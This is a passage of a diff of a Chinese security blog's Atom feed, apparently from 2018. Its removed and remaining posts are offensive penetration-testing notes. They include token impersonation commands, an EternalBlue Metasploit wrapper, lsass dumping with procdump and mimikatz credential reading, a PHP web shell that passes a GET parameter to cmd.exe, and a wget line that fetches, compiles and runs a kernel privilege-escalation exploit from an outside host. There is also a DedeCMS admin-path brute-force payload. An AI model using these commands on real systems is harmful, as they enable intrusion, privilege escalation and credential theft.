class="line">Invoke-TokenManipulation -Enumerate 或者ShowAll //列出所有token</span><br><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot; //提权到system</span><br><span class="line">更多的去看脚本里面的注释....</span><br></pre></td></tr></table></figure></p><p>Metasploit:</p><p>incognito<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito 加载incognito</span><br><span class="line">list_tokens -u 列出所有token</span><br><span class="line">impersonate_token &quot;WIN-FV3F5ATOOP6\\Life&quot; 这里是需要双斜杠的..</span><br><span class="line">rev2self 或者drop_token 返回之前的token..</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/14/Cr018P.png" alt=""></p><p>steal_token<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个是从进程中窃取token</span><br><span class="line">ps</span><br><span class="line">steal_token pid</span><br><span class="line">drop_token</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/14/CrWGHP.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;唔，笔记，做个总结….&lt;/p&gt;
-&lt;p&gt;当你提权拿到sys的时候，你想看个administrator屏幕啥的或者以这个权限执行啥啥的时候…(sys运行远控弹回来的是黑屏..)&lt;/p&gt;
-&lt;p&gt;之前这种我一般是sys弹到msf，迁移进程来降权到administrator执行…..
-      
-    
-    </summary>
-    
-    
-      <category term="令牌" scheme="http://life-time.me/tags/%E4%BB%A4%E7%89%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一个ms17-010的轮子</title>
-    <link href="http://life-time.me/2018/05/08/ms17-010%E8%BD%AE%E5%AD%90/"/>
-    <id>http://life-time.me/2018/05/08/ms17-010轮子/</id>
-    <published>2018-05-08T11:08:56.000Z</published>
-    <updated>2018-05-13T06:12:52.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="https-github-com-dust-life-Eternalblue-Doublepulsar-Metasploit-for-Windows"><a href="#https-github-com-dust-life-Eternalblue-Doublepulsar-Metasploit-for-Windows" class="headerlink" title="https://github.com/dust-life/Eternalblue-Doublepulsar-Metasploit-for-Windows"></a><a href="https://github.com/dust-life/Eternalblue-Doublepulsar-Metasploit-for-Windows" target="_blank" rel="noopener">https://github.com/dust-life/Eternalblue-Doublepulsar-Metasploit-for-Windows</a></h3><p>唔，这是一个轮子，你可能会说没什么卵用，其实我也是这么认为的~</p><p>原模块地址:<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p><p>这个模块算是我觉得在msf比较好用的了，直接wine调用exe打的，唔，效果和原版的一样<br>但是苦于只能在linux上面使用，唔，然后我就想改改弄到win上面来用…<br>配合pentestbox使用，里面的四个路径根据你的实际情况改~</p><p>目前只支持reverse_tcp 其他payload请自行修改第94行代码~</p><p>有什么不妥之处请提交issues</p><p>基本效果如下：<br><img src="https://s1.ax1x.com/2018/05/08/Cd0zkV.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;https-github-com-dust-life-Eternalblue-Doublepulsar-Metasploit-for-Windows&quot;&gt;&lt;a href=&quot;#https-github-com-dust-life-Eternalblue-Doublep
-      
-    
-    </summary>
-    
-    
-      <category term="ms17-010" scheme="http://life-time.me/tags/ms17-010/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>dump内存读密码(hash)</title>
-    <link href="http://life-time.me/2018/05/08/%E5%86%85%E5%AD%98dump/"/>
-    <id>http://life-time.me/2018/05/08/内存dump/</id>
-    <published>2018-05-08T03:30:47.000Z</published>
-    <updated>2018-05-08T03:43:48.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>唔，记的笔记，某些情况下，比较有用，国外很多杀毒还是禁止dump进程的….</p><p>密码会储存在 lsass进程中(08及以下可以读出明文密码)<br>用procdump或者<strong>任务管理器</strong>将lsass进程转换为储存文件（procdump是微软的东西，白名单的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe MyDump.dmp （听说加了at不需要管理员权限）</span><br><span class="line">procdump.exe  -ma lsass.exe MyDump.dmp</span><br></pre></td></tr></table></figure></p><p>转换方法大全:<a href="https://www.cnblogs.com/jiangxueqiao/archive/2017/08/29/7447852.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangxueqiao/archive/2017/08/29/7447852.html</a><br>打包回来用mimikatz读取:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa :: Minidump MyDump.dmp</span><br><span class="line">sekurlsa :: logonPasswords</span><br></pre></td></tr></table></figure></p><p>文章:<br><a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php" target="_blank" rel="noopener">https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php</a><br>    <a href="http://blog.digital-forensics.it/2014/03/mimikatz-offline-addendum_28.html" target="_blank" rel="noopener">http://blog.digital-forensics.it/2014/03/mimikatz-offline-addendum_28.html</a><br>    <a href="https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/" target="_blank" rel="noopener">https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;唔，记的笔记，某些情况下，比较有用，国外很多杀毒还是禁止dump进程的….&lt;/p&gt;
-&lt;p&gt;密码会储存在 lsass进程中(08及以下可以读出明文密码)&lt;br&gt;用procdump或者&lt;strong&gt;任务管理器&lt;/strong&gt;将lsass进程转换为储存文件（procdump是
-      
-    
-    </summary>
-    
-    
-      <category term="mimikatz" scheme="http://life-time.me/tags/mimikatz/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>php命令执行函数笔记</title>
-    <link href="http://life-time.me/2018/05/07/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    <id>http://life-time.me/2018/05/07/php命令执行/</id>
-    <published>2018-05-07T03:43:29.000Z</published>
-    <updated>2018-05-07T04:04:22.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>唔，笔记。</p><p>命令执行函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">exec </span><br><span class="line">pcntl_exec（linux）</span><br><span class="line">shell_exec = ``(反单引号)</span><br><span class="line">popen</span><br><span class="line">proc_open</span><br></pre></td></tr></table></figure></p><p>ps:<br>iis可以尝试调用com来执行命令<br>        Wscript.Shell和Shell.Application<br>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);  </span><br><span class="line">$exec=$phpwsh-&gt;exec(&quot;cmd.exe /c &quot;.$_GET[&apos;c&apos;].&quot;&quot;);  </span><br><span class="line">$stdout = $exec-&gt;StdOut();  </span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();  </span><br><span class="line">echo $stroutput;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>linux还可以尝试用LD_PRELOAD,扩展库绕过</p><p>参考链接:<br><a href="http://blog.leanote.com/post/xuxi/PHP-Webshell%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">http://blog.leanote.com/post/xuxi/PHP-Webshell%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95</a><br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;唔，笔记。&lt;/p&gt;
-&lt;p&gt;命令执行函数:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
-      
-    
-    </summary>
-    
-    
-      <category term="php 命令执行" scheme="http://life-time.me/tags/php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>搭建小飞机 SSR</title>
+    <title>SSR</title>
     <link href="http://life-time.me/2018/04/18/ssr/"/>
     <id>http://life-time.me/2018/04/18/ssr/</id>
     <published>2018-04-18T03:15:57.000Z</published>
-    <updated>2018-04-24T11:04:02.000Z</updated>
+    <updated>2019-12-13T09:44:19.516Z</updated>
     
     <content type="html"><![CDATA[<p>单用户的~</p><h3 id="GitHub-地址"><a href="#GitHub-地址" class="headerlink" title="GitHub 地址"></a>GitHub 地址</h3><blockquote><p>作者已经删除了该项目，下面这个是其他人fork的<br><a href="https://github.com/shadowsocksrr/shadowsocksr.git" target="_blank" rel="noopener">https://github.com/shadowsocksrr/shadowsocksr.git</a></p></blockquote><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>先git下来</p><blockquote><p>git clone <a href="https://github.com/shadowsocksrr/shadowsocksr.git" target="_blank" rel="noopener">https://github.com/shadowsocksrr/shadowsocksr.git</a></p></blockquote><p>安装python以及pip<br><strong>ubuntu:</strong></p><blockquote><p>apt-get install python-gevent python-pip python-m2crypto python-wheel python-setuptools</p></blockquote><p>cd 到目录</p><blockquote><p>cd shadowsocksr</p></blockquote><p>初始化一下</p><blockquote><p>./initcfg.sh</p></blockquote><p>修改配置文件(端口，密码，加密等)</p><blockquote><p>vim user-config.json</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> &quot;server&quot;: &quot;0.0.0.0&quot;,</span><br><span class="line"> &quot;server_ipv6&quot;: &quot;::&quot;,</span><br><span class="line"> &quot;server_port&quot;: 8388, //自定义端口</span><br><span class="line"> &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line"> &quot;local_port&quot;: 1080,</span><br><span class="line"> </span><br><span class="line"> &quot;password&quot;: &quot;m&quot;, //密码</span><br><span class="line"> &quot;timeout&quot;: 120,</span><br><span class="line"> &quot;udp_timeout&quot;: 60,</span><br><span class="line"> &quot;method&quot;: &quot;aes-128-ctr&quot;, //加密</span><br><span class="line"> &quot;protocol&quot;: &quot;auth_aes128_md5&quot;, //协议</span><br><span class="line"> &quot;protocol_param&quot;: &quot;&quot;,</span><br><span class="line"> &quot;obfs&quot;: &quot;tls1.2_ticket_auth_compatible&quot;, //混淆，这里建议改成tls1.2_ticket_auth</span><br><span class="line"> &quot;obfs_param&quot;: &quot;&quot;,</span><br><span class="line"> &quot;speed_limit_per_con&quot;: 0,</span><br><span class="line"> &quot;speed_limit_per_user&quot;: 0,</span><br><span class="line"> </span><br><span class="line"> &quot;dns_ipv6&quot;: false,</span><br><span class="line"> &quot;connect_verbose_info&quot;: 0,</span><br><span class="line"> &quot;redirect&quot;: &quot;&quot;,</span><br><span class="line"> &quot;fast_open&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>改完保存，cd到shadowsocks</strong></p><blockquote><p>chmod +x *.sh   //给权限</p></blockquote><p>启动服务：</p><blockquote><p>./logrun.sh //后台运行<br>如果要调试就python server.py，关闭终端就会断开</p></blockquote><p>停止服务：</p><blockquote><p>./stop.sh</p></blockquote><p>查看日志：</p><blockquote><p>./tail.sh</p></blockquote>]]></content>
     
@@ -251,53 +109,11 @@
   </entry>
   
   <entry>
-    <title>更新msf5.0</title>
-    <link href="http://life-time.me/2018/03/18/ubuntu%E5%AE%89%E8%A3%85msf5-0/"/>
-    <id>http://life-time.me/2018/03/18/ubuntu安装msf5-0/</id>
-    <published>2018-03-18T03:33:38.000Z</published>
-    <updated>2018-05-08T11:42:26.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="之前就听说5-0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受………"><a href="#之前就听说5-0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受………" class="headerlink" title="= =之前就听说5.0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受………."></a>= =之前就听说5.0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受……….</h3><p>环境:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 17.10</span><br><span class="line">win的话，有空再填</span><br><span class="line">ruby 2.3.6p384 (2017-12-14) [x86_64-linux-gnu] (这个地方版本自己用rvm切换)</span><br></pre></td></tr></table></figure></p><h3 id="直接上命令，懒得截图报错了"><a href="#直接上命令，懒得截图报错了" class="headerlink" title="直接上命令，懒得截图报错了."></a>直接上命令，懒得截图报错了.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rapid7/metasploit-framework.git</span><br><span class="line">cd metasploit-framework</span><br><span class="line">sudo apt-get install  libpq-dev ruby-dev libpcap-dev zlib1g-dev liblzma-dev libsqlite3-dev</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p><strong>ln -s 你值得拥有</strong></p><h3 id="emmmmmm"><a href="#emmmmmm" class="headerlink" title="emmmmmm"></a>emmmmmm</h3><p><img src="https://s1.ax1x.com/2018/03/18/9IqcE8.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;之前就听说5-0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受………&quot;&gt;&lt;a href=&quot;#之前就听说5-0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受………&quot; class=&quot;headerlink&quot; title=&quot;= 
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ubuntu本地提权复现</title>
-    <link href="http://life-time.me/2018/03/16/ubuntu%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://life-time.me/2018/03/16/ubuntu内核提权复现/</id>
-    <published>2018-03-16T09:29:03.000Z</published>
-    <updated>2018-05-08T11:43:44.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="ubuntu本地提权exp"><a href="#ubuntu本地提权exp" class="headerlink" title="ubuntu本地提权exp:"></a>ubuntu本地提权exp:</h3><p>wget -P /tmp <a href="http://cyseclabs.com/exploits/upstream44.c" target="_blank" rel="noopener">http://cyseclabs.com/exploits/upstream44.c</a> &amp;&amp;cd /tmp &amp;&amp; gcc -o exp  upstream44.c &amp;&amp; chmod 777 exp &amp;&amp; ./exp</p><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 16.04.4</span><br></pre></td></tr></table></figure><h3 id="这个地方有点坑，ubuntu默认不安装gcc，还有一个莫名的报错，简直emmmmmmm。"><a href="#这个地方有点坑，ubuntu默认不安装gcc，还有一个莫名的报错，简直emmmmmmm。" class="headerlink" title="这个地方有点坑，ubuntu默认不安装gcc，还有一个莫名的报错，简直emmmmmmm。"></a>这个地方有点坑，ubuntu默认不安装gcc，还有一个莫名的报错，简直emmmmmmm。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc libc6-dev</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/03/18/9ILozd.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;ubuntu本地提权exp&quot;&gt;&lt;a href=&quot;#ubuntu本地提权exp&quot; class=&quot;headerlink&quot; title=&quot;ubuntu本地提权exp:&quot;&gt;&lt;/a&gt;ubuntu本地提权exp:&lt;/h3&gt;&lt;p&gt;wget -P /tmp &lt;a href=&quot;ht
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>dede通配符爆破后台~</title>
     <link href="http://life-time.me/2018/03/03/dede%E9%80%9A%E9%85%8D%E7%AC%A6%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0/"/>
     <id>http://life-time.me/2018/03/03/dede通配符爆破后台/</id>
     <published>2018-03-03T04:37:18.000Z</published>
-    <updated>2018-05-08T11:44:52.000Z</updated>
+    <updated>2019-12-13T09:33:07.000Z</updated>
     
     <content type="html"><![CDATA[<h3 id="emmmmmm，再也不用担心找不到dede的后台了-只支持win"><a href="#emmmmmm，再也不用担心找不到dede的后台了-只支持win" class="headerlink" title="emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)"></a>emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)</h3><ul><li><p><strong>exp(php):<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/2064</a></strong></p></li><li><p><strong>exp(python3):<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a></strong></p><ul><li>这个地方要说一下，包含了common.inc.php的都可以跑…..</li></ul></li></ul><h3 id="预防tags-php和index-php不能跑，这里我总结了一下可以利用的php"><a href="#预防tags-php和index-php不能跑，这里我总结了一下可以利用的php" class="headerlink" title="预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:"></a>预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:</h3><ul><li><strong>这里二级目录爆破的话，exp的语句需要改一下</strong></li></ul> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost=save&amp;_FILES[b4dboy][tmp_name]=../$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</span><br></pre></td></tr></table></figure><blockquote><ul><li>/install/module_autos.php</li><li>/m/index.php</li><li>/m/list.php</li><li>/m/view.php</li><li>/member/config.php</li><li>/plus/ad_js.php</li><li>/plus/advancedsearch.php</li><li>/plus/arcmulti.php</li><li>/plus/bookfeedback.php</li><li>/plus/bookfeedback_js.php</li><li>/plus/car.php</li><li>/plus/carbuyaction.php</li><li>/plus/comments_frame.php</li><li>/plus/count.php</li><li>/plus/digg_ajax.php</li><li>/plus/digg_frame.php</li><li>/plus/disdls.php</li><li>/plus/diy.php</li><li>/plus/download.php</li><li>/plus/erraddsave.php</li><li>/plus/feedback.php</li><li>/plus/feedback_ajax.php</li><li>/plus/feedback_js.php</li><li>/plus/flink.php</li><li>/plus/flink_add.php</li><li>/plus/freelist.php</li><li>/plus/guestbook.php</li><li>/plus/heightsearch.php</li><li>/plus/list.php</li><li>/plus/mytag_js.php</li><li>/plus/posttocar.php</li><li>/plus/qrcode.php</li><li>/plus/recommend.php</li><li>/plus/rss.php</li><li>/plus/search.php</li><li>/plus/showphoto.php</li><li>/plus/stow.php</li><li>/plus/task.php</li><li>/plus/view.php</li><li>/plus/vote.php</li></ul></blockquote>]]></content>
     
@@ -312,52 +128,6 @@
     
     
       <category term="通配符" scheme="http://life-time.me/tags/%E9%80%9A%E9%85%8D%E7%AC%A6/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>win远程下载文件的各种姿势~</title>
-    <link href="http://life-time.me/2018/01/12/win-download/"/>
-    <id>http://life-time.me/2018/01/12/win-download/</id>
-    <published>2018-01-12T09:49:23.000Z</published>
-    <updated>2018-01-12T10:02:52.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大"><a href="#收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大" class="headerlink" title="收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大~"></a>收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大<del>~</del></h3><ul><li><a href="http://www.cnblogs.com/backlion/p/7908563.html" target="_blank" rel="noopener">http://www.cnblogs.com/backlion/p/7908563.html</a></li><li><a href="http://www.freebuf.com/articles/system/155147.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/155147.html</a></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大&quot;&gt;&lt;a href=&quot;#收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大&quot; class=&quot;headerlink&quot; title=&quot;收集了两篇关于win下的远程下载方式
-      
-    
-    </summary>
-    
-    
-      <category term="win 远程下载" scheme="http://life-time.me/tags/win-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Eternalblue</title>
-    <link href="http://life-time.me/2018/01/12/Eternalblue/"/>
-    <id>http://life-time.me/2018/01/12/Eternalblue/</id>
-    <published>2018-01-12T06:53:20.000Z</published>
-    <updated>2018-05-06T11:12:54.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="最近一直在弄关于Eternalblue的东西，fb-py和msf的模块又不是很方便，所以去找了一下其他的利用工具"><a href="#最近一直在弄关于Eternalblue的东西，fb-py和msf的模块又不是很方便，所以去找了一下其他的利用工具" class="headerlink" title="最近一直在弄关于Eternalblue的东西，fb.py和msf的模块又不是很方便，所以去找了一下其他的利用工具"></a>最近一直在弄关于Eternalblue的东西，fb.py和msf的模块又不是很方便，所以去找了一下其他的利用工具</h3><h3 id="原版"><a href="#原版" class="headerlink" title="原版:"></a>原版:</h3><ul><li><p><a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">https://github.com/misterch0c/shadowbroker</a></p><h3 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h3></li><li><p><a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a></p></li><li><a href="https://github.com/REPTILEHAUS/Eternal-Blue" target="_blank" rel="noopener">https://github.com/REPTILEHAUS/Eternal-Blue</a></li><li><a href="http://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/" target="_blank" rel="noopener">http://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/</a></li><li><a href="https://www.anquanke.com/post/id/86309" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86309</a> (32位)</li><li><a href="https://www.anquanke.com/post/id/86562" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86562</a> (64位)</li><li><a href="https://www.exploit-db.com/exploits/41987/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41987/</a><h3 id="win"><a href="#win" class="headerlink" title="win:"></a>win:</h3></li><li><a href="http://lu4n.com/ms17-010-exploit-green-version-without-python/" target="_blank" rel="noopener">http://lu4n.com/ms17-010-exploit-green-version-without-python/</a></li><li><a href="https://www.t00ls.net/thread-39405-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-39405-1-1.html</a><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell:"></a>powershell:</h3></li><li><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/exploitation/Exploit-EternalBlue.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/master/data/module_source/exploitation/Exploit-EternalBlue.ps1</a></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;最近一直在弄关于Eternalblue的东西，fb-py和msf的模块又不是很方便，所以去找了一下其他的利用工具&quot;&gt;&lt;a href=&quot;#最近一直在弄关于Eternalblue的东西，fb-py和msf的模块又不是很方便，所以去找了一下其他的利用工具&quot; class=
-      
-    
-    </summary>
-    
-    
-      <category term="ms17-010" scheme="http://life-time.me/tags/ms17-010/"/>
     
   </entry>
   
